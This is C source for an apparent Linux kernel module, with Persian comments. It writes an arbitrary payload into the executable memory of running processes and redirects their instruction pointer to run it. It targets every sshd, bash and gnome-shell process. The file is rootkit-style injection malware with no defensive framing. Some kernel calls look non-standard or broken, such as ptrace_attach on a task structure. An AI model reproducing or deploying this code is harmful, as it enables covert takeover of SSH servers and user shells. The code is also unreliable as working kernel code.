#include <linux/sched.h>
#include <linux/ptrace.h>
#include <linux/elf.h>
#include <linux/binfmts.h>
#include "defines.h"

// تزریق کد به فضای کاربر
int inject_into_process(pid_t pid, const char *payload, size_t size) {
    struct task_struct *task;
    struct vm_area_struct *vma;
    unsigned long base_addr = 0;
    
    // یافتن task
    task = find_task_by_vpid(pid);
    if (!task) return -ESRCH;
    
    // یافتن آدرس base اجرایی
    for (vma = task->mm->mmap; vma; vma = vma->vm_next) {
        if (vma->vm_file && vma->vm_flags & VM_EXEC) {
            base_addr = vma->vm_start;
            break;
        }
    }
    
    if (!base_addr) return -EFAULT;
    
    // نوشتن پیلود در حافظه فرآیند
    unsigned long remote_addr = base_addr + 0x1000;
    struct pt_regs regs;
    
    // ذخیره رجیسترهای فعلی
    ptrace_attach(task);
    memcpy(&regs, task_pt_regs(task), sizeof(regs));
    
    // کپی پیلود به حافظه فرآیند
    access_process_vm(task, remote_addr, (void *)payload, size, FOLL_WRITE);
    
    // تغییر RIP برای اجرای پیلود
    regs.rip = remote_addr;
    memcpy(task_pt_regs(task), &regs, sizeof(regs));
    
    ptrace_detach(task);
    return 0;
}

// تزریق به تمام فرآیندهای خاص
void inject_all(const char *payload, size_t size) {
    struct task_struct *task;
    const char *targets[] = {"sshd", "bash", "gnome-shell", NULL};
    
    for_each_process(task) {
        for (int i = 0; targets[i]; i++) {
            if (strcmp(task->comm, targets[i]) == 0) {
                inject_into_process(task->pid, payload, size);
            }
        }
    }
}
